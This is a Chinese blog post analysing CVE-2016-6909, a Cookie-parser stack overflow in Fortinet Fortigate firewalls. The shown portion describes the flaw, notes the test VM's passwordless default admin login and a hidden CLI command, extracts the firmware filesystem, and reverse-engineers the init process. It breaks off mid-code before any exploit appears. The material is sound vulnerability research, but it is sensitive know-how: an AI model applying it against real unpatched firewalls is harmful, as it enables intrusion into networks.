

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="ÂΩÅÊàëÁùÄüî•‰∫Ü.jpg">
<meta property="og:type" content="article">
<meta property="og:title" content="„ÄêCVE.0x03„ÄëCVE-2016-6909 Fortigate Èò≤ÁÅ´Â¢ô Cookie Ëß£ÊûêÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê">
<meta property="og:url" content="http://blog.arttnba3.cn/2021/08/10/CVE-0X03-CVE-2016-6909/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="ÂΩÅÊàëÁùÄüî•‰∫Ü.jpg">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/08/14/18yn6JfWSH2vaYC.png">
<meta property="article:published_time" content="2021-08-10T09:42:05.000Z">
<meta property="article:modified_time" content="2021-09-08T16:29:03.000Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="ret2text">
<meta property="article:tag" content="ROP">
<meta property="article:tag" content="Ê†àÊ∫¢Âá∫">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="shellcode">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="ret2shellcode">
<meta property="article:tag" content="Fortigate">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.loli.net/2021/08/14/18yn6JfWSH2vaYC.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>„ÄêCVE.0x03„ÄëCVE-2016-6909 Fortigate Èò≤ÁÅ´Â¢ô Cookie Ëß£ÊûêÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.arttnba3.cn","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¬ß"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                È¶ñÈ°µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                ÂΩíÊ°£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                ÂàÜÁ±ª
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Ê†áÁ≠æ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                ÂÖ≥‰∫é
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                ÂèãÈìæ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://i.loli.net/2021/08/14/BWMCH8dNT5jVhbX.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="„ÄêCVE.0x03„ÄëCVE-2016-6909 Fortigate Èò≤ÁÅ´Â¢ô Cookie Ëß£ÊûêÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-08-10 17:42" pubdate>
          2021Âπ¥8Êúà10Êó• ‰∏ãÂçà
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          17k Â≠ó
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          141 ÂàÜÈíü
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> Ê¨°
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">„ÄêCVE.0x03„ÄëCVE-2016-6909 Fortigate Èò≤ÁÅ´Â¢ô Cookie Ëß£ÊûêÊºèÊ¥ûÂ§çÁé∞ÂèäÁÆÄË¶ÅÂàÜÊûê</h1>
            
              <p class="note note-info">
                
                  
                    Êú¨ÊñáÊúÄÂêéÊõ¥Êñ∞‰∫éÔºö2021Âπ¥9Êúà9Êó• ÂáåÊô®
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>ÂΩÅÊàëÁùÄüî•‰∫Ü.jpg</p>
<span id="more"></span>

<blockquote>
<p>ÁâπÂà´ÁâπÂà´ÁâπÂà´ÁâπÂà´*N‚Ä¶.ÁÆÄÂçïÁöÑ‰∏Ä‰∏™Ê¥ûÔºåÊú¨Êù•Â∫îËØ•‰∏ÄÂ§©Â∞±ÂºÑÂ•ΩÁöÑÔºåÊÑ£ÊòØÂõ†‰∏∫ÂêÑÁßçÁéÑÂ≠¶ÈóÆÈ¢òÂú®ÂÖ¨Âè∏Êãó‰∫ÜÂçäÂë®‚Ä¶.</p>
<p>ËøòÊòØÂõ†‰∏∫Â§™Ëèú‰∫ÜÔºàÊÅºÔºâ</p>
</blockquote>
<h1 id="0x00-‰∏ÄÂàáÂºÄÂßã‰πãÂâç"><a href="#0x00-‰∏ÄÂàáÂºÄÂßã‰πãÂâç" class="headerlink" title="0x00.‰∏ÄÂàáÂºÄÂßã‰πãÂâç"></a>0x00.‰∏ÄÂàáÂºÄÂßã‰πãÂâç</h1><p>Fortigate Á≥ªÂàóÊòØ FortinetÔºàÈ£ûÂ°îÔºâÂÖ¨Âè∏Êóó‰∏ãÁöÑÈò≤ÁÅ´Â¢ô‰∫ßÂìÅ‰πã‰∏ÄÔºå2016Âπ¥ÔºåShadow BrokersÂÖ¨ÂºÄ‰∫ÜÈªëÂÆ¢ÁªÑÁªá<strong>Equation Group</strong>ÈíàÂØπÂêÑÂ§ßÂéÇÂïÜÈò≤ÁÅ´Â¢ôÁöÑ<a target="_blank" rel="noopener" href="https://musalbas.com/blog/2016/08/16/equation-group-firewall-operations-catalogue.html">ÊºèÊ¥ûÂà©Áî®Â∑•ÂÖ∑</a>ÔºåÂ≠òÂú®‰∫é Fortigate ‰∏≠ÁöÑ‰∏Ä‰∏™ÈöêËîΩÁöÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û‰πüÂ∞±Ê≠§Ë¢´Â§ßÁôΩ‰∫éÂ§©‰∏ã</p>
<p>Âú® <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6909">cve.mitre.org</a> ‰∏äÂØπËØ•ÊºèÊ¥ûÁöÑËØ¥ÊòéÂ¶Ç‰∏ãÔºö</p>
<blockquote>
<p>Buffer overflow in the Cookie parser in Fortinet FortiOS 4.x before 4.1.11, 4.2.x before 4.2.13, and 4.3.x before 4.3.9 and FortiSwitch before 3.4.3 allows remote attackers to execute arbitrary code via a crafted HTTP request, aka EGREGIOUSBLUNDER.</p>
</blockquote>
<p>Á¨îËÄÖ‰ªäÂ§©Â∞ÜÂÄüÂä©ÂèóÂΩ±ÂìçÁöÑ‰∏Ä‰∏™ËôöÊãüÊú∫ÁâàÊú¨ <strong>FGT_VM-v400-build0482</strong> Êù•ÂàÜÊûêËØ•ÊºèÊ¥û</p>
<h2 id="ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨"><a href="#ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨" class="headerlink" title="ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨"></a>ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨</h2><p>Fortinet FortiOS 4.x &lt; 4.1.11, 4.2.x &lt; 4.2.13, 4.3.x &lt; 4.3.9„ÄÅFortiSwitch &lt; 3.4.3</p>
<h2 id="ÁôªÂÖ•-fortigate-VM"><a href="#ÁôªÂÖ•-fortigate-VM" class="headerlink" title="ÁôªÂÖ• fortigate VM"></a>ÁôªÂÖ• fortigate VM</h2><p>ÈªòËÆ§Ë¥¶Êà∑ÊòØ <code>admin</code> ÔºåÊó†ÂØÜÁ†ÅÔºåÂèØ‰ª•Áî®‰∫éÊú¨Âú∞ÊµãËØï</p>
<p><img src="https://i.loli.net/2021/08/13/7WNytbF5MGnsfVA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÈò≤ÁÅ´Â¢ô‰∏ç‰ºöÁªôÊàë‰ª¨Êèê‰æõ shellÔºåËÄåÊòØ<strong>‰ªÖ</strong>Êèê‰æõ‰∏Ä‰∏™ÁÆÄÊòì CLI ÁïåÈù¢ÔºåÂú®‰∏äÈù¢Êàë‰ª¨Âè™ËÉΩ‰ΩøÁî®ÂÖ∂ÊâÄÂÜÖÁΩÆÊèê‰æõÁöÑÂá†‰∏™ÂäüËÉΩ</p>
<h2 id="ÂêéÈó®Êåá‰ª§"><a href="#ÂêéÈó®Êåá‰ª§" class="headerlink" title="ÂêéÈó®Êåá‰ª§"></a>ÂêéÈó®Êåá‰ª§</h2><p>‰ªÖÈù†Èò≤ÁÅ´Â¢ôÁöÑÂäüËÉΩÂü∫Êú¨‰∏ä‰∏çÁÆóÊòØ‰∏Ä‰∏™ÂèØÁî®ÁöÑÊìç‰ΩúÁ≥ªÁªüÔºåÂõ†Ê≠§ fortigate VM CLI Êèê‰æõÁªôÊàë‰ª¨‰∏Ä‰∏™ÈöêËóèÊåá‰ª§ <code>fnsysctl</code> ‰ª•ÊâßË°åÂÖ∂ÈôêÂà∂ÁöÑËØ∏Â¶Ç <code>ls</code> Á≠âÁöÑ‰∏Ä‰∫õÂü∫Êú¨ÂëΩ‰ª§Ôºå<strong>‰∏çÂåÖÊã¨ shell</strong></p>
<blockquote>
<p>ÂêéÁª≠ÈÄöËøáÈÄÜÂêëÂàÜÊûêÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞ÂÖ∂Á®ãÂ∫èÊú¨Ë∫´ÈôêÂà∂‰∫ÜËøáÊª§ shÔºåÂõ†Ê≠§Êàë‰ª¨Êó†Ê≥ïÈÄöËøá CLI Áõ¥Êé•ÊãøÂà∞‰∏Ä‰∏™ shell</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/4G3kJV8vxMpqTsn.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x01-ÊºèÊ¥ûÂàÜÊûê"><a href="#0x01-ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="0x01.ÊºèÊ¥ûÂàÜÊûê"></a>0x01.ÊºèÊ¥ûÂàÜÊûê</h1><h2 id="Êñá‰ª∂ÊèêÂèñ"><a href="#Êñá‰ª∂ÊèêÂèñ" class="headerlink" title="Êñá‰ª∂ÊèêÂèñ"></a>Êñá‰ª∂ÊèêÂèñ</h2><p>È¶ñÂÖàÂ∞ÜÁ°¨ÁõòÈïúÂÉè <code>fortios.vmdk</code> ÊåÇËΩΩÂà∞ <code>/mnt</code> ÁõÆÂΩï‰∏ãÔºö</p>
<p><img src="https://i.loli.net/2021/08/11/dsRm83O24UhATKj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo fdisk -l</span><br>...<br>Device     Boot  Start     End Sectors  Size Id Type<br>/dev/sdb1  *         1  262144  262144  128M 83 Linux<br>/dev/sdb2       262145 4194304 3932160  1.9G 83 Linux<br>...<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /mnt/fortios</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/fortios</span><br></code></pre></td></tr></table></figure>


<p>‰πãÂêéÊàë‰ª¨‰æøËÉΩÂ§üÂú® <code>/mnt</code> ÁõÆÂΩï‰∏ãÊü•ÁúãÁ£ÅÁõò‰∏≠ÁöÑÊñá‰ª∂Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /mnt/fortios</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 23392<br>drwxr-xr-x 3 root root     1024 Sep 20  2011 ./<br>drwxr-xr-x 5 root root     4096 Aug 10 18:43 ../<br>-rw-r--r-- 1 root root  5182591 Sep 20  2011 datafs.tar.gz<br>-rw-r--r-- 1 root root      107 Sep 20  2011 extlinux.conf<br>lrwxrwxrwx 1 root root       12 Sep 20  2011 flatkc -&gt; ./flatkc.smp<br>-rw-r--r-- 1 root root      256 Sep 20  2011 flatkc.chk<br>-rw-r--r-- 1 root root  1437300 Sep 20  2011 flatkc.nosmp<br>-rw-r--r-- 1 root root  1501003 Sep 20  2011 flatkc.smp<br>-r--r--r-- 1 root root    32256 Sep 20  2011 ldlinux.sys<br>drwx------ 2 root root    12288 Sep 20  2011 lost+found/<br>-rw-r--r-- 1 root root 15678360 Sep 20  2011 rootfs.gz<br>-rw-r--r-- 1 root root      256 Sep 20  2011 rootfs.gz.chk<br></code></pre></td></tr></table></figure>

<blockquote>
<p>‰πüÂèØ‰ª•ÈÄöËøáÂ¶Ç‰∏ãÊñπÂºèÁõ¥Êé•ÊåÇËΩΩÈïúÂÉèÊñá‰ª∂Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe nbd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/nbd1p1 /mnt</span><br></code></pre></td></tr></table></figure>
</blockquote>
<p>Êü•ÁúãÊñá‰ª∂Á±ªÂûãÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞‰∏§‰∏™ÂÜÖÊ†∏ÈïúÂÉèÊñá‰ª∂ <code>flatkc.smp</code> ‰∏é <code>flatkc.nosmp</code>Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">file *</span><br>datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size modulo 2^32 8724480<br>extlinux.conf: ASCII text<br>flatkc:        symbolic link to ./flatkc.smp<br>flatkc.chk:    data<br>flatkc.nosmp:  Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGA<br>flatkc.smp:    Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGA<br>ldlinux.sys:   SYSLINUX loader (version 4.00)<br>lost+found:    directory<br>rootfs.gz:     gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size modulo 2^32 19077120<br>rootfs.gz.chk: data<br></code></pre></td></tr></table></figure>

<p>Âú® <code>extlinux.conf</code> ‰∏≠ÊåáÂÆö‰∫Ü‰∏Ä‰∫õÂü∫Êú¨ÈÖçÁΩÆÔºåÂåÖÊã¨Êñá‰ª∂Á≥ªÁªü <code>rootfs.gz</code>Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> extlinux.conf</span> <br>DEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz<br></code></pre></td></tr></table></figure>

<p>Ëß£Âéã <code>rootfs.gz</code> Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar xf ./rootfs.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 28216<br>drwxr-xr-x 10 arttnba3 arttnba3     4096 Sep 20  2011 ./<br>drwxr-xr-x  5 arttnba3 arttnba3     4096 Aug 10 18:52 ../<br>-rw-r--r--  1 arttnba3 arttnba3  8742988 Sep 20  2011 bin.tar.xz<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data/<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data2/<br>drwxr-xr-x  5 arttnba3 arttnba3     4096 Sep 20  2011 dev/<br>lrwxrwxrwx  1 arttnba3 arttnba3        8 Sep 20  2011 etc -&gt; data/etc<br>lrwxrwxrwx  1 arttnba3 arttnba3        1 Sep 20  2011 fortidev -&gt; //<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 lib/<br>-rw-r--r--  1 arttnba3 arttnba3  4424536 Sep 20  2011 migadmin.tar.xz<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 proc/<br>-rw-r--r--  1 arttnba3 arttnba3 15678360 Aug 10 18:54 rootfs.gz<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 sbin/<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 tmp/<br>drwxr-xr-x  8 arttnba3 arttnba3     4096 Sep 20  2011 var/<br></code></pre></td></tr></table></figure>

<h2 id="ÂêØÂä®ËøáÁ®ãÂàÜÊûê"><a href="#ÂêØÂä®ËøáÁ®ãÂàÜÊûê" class="headerlink" title="ÂêØÂä®ËøáÁ®ãÂàÜÊûê"></a>ÂêØÂä®ËøáÁ®ãÂàÜÊûê</h2><h3 id="I-init-ËøõÁ®ã"><a href="#I-init-ËøõÁ®ã" class="headerlink" title="I. init ËøõÁ®ã"></a>I. init ËøõÁ®ã</h3><p>Linux ÂÜÖÊ†∏ËΩΩÂÖ•Âêé‰ºöÂêØÂä®Á¨¨‰∏Ä‰∏™ËøõÁ®ã <code>init</code>ÔºåÁ®ãÂ∫è‰∫åËøõÂà∂Êñá‰ª∂ÈÄöÂ∏∏ÊòØ <code>/sbin/init</code>ÔºåËØ•Êñá‰ª∂Á≥ªÁªü‰∏≠ÁöÑ init Êñá‰ª∂ËæÉÂ∞èÔºåÊïÖÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•Â∞ÜÂÖ∂ÊãñÂÖ• IDA ËøõË°åÂàÜÊûêÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *argv[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+0h] [ebp-8h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)sub_8049254(<span class="hljs-string">&quot;bin&quot;</span>) &gt;= <span class="hljs-number">0</span> )<br>    sub_8049254(<span class="hljs-string">&quot;migadmin&quot;</span>);<br>  unlink(<span class="hljs-string">&quot;/sbin/xz&quot;</span>);<br>  unlink(<span class="hljs-string">&quot;/sbin/ftar&quot;</span>);<br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/init&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  execve(<span class="hljs-string">&quot;/bin/init&quot;</span>, argv, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÂÖ∂‰∏≠ <code>sub_8049254()</code> Ê†∏ÂøÉÈÄÜÂêëÁªìÊûúÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_8049254</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-built_in">snprintf</span>(s, <span class="hljs-number">0x200</span>u, <span class="hljs-string">&quot;/%s.tar.xz&quot;</span>, a1);<br>  <span class="hljs-comment">//...</span><br>  v1 = fork();<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      waitpid(v1, &amp;stat_loc, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> ( BYTE1(stat_loc) )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br>      unlink(s);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/sbin/xz&quot;</span>;<br>    argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;--check=sha256&quot;</span>;<br>    argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;-d&quot;</span>;<br>    argv[<span class="hljs-number">3</span>] = s;<br>    argv[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>    execv(<span class="hljs-string">&quot;/sbin/xz&quot;</span>, argv);<br>  &#125;<br>  <span class="hljs-built_in">snprintf</span>(name, <span class="hljs-number">0x200</span>u, <span class="hljs-string">&quot;/%s.tar&quot;</span>, a1);<br>  v3 = fork();<br>  <span class="hljs-keyword">if</span> ( v3 )<br>  &#123;<br>    <span class="hljs-comment">//..</span><br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    waitpid(v3, &amp;v10, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( !BYTE1(v10) )<br>    &#123;<br>      unlink(name);<br>      <span class="hljs-keyword">return</span> <span 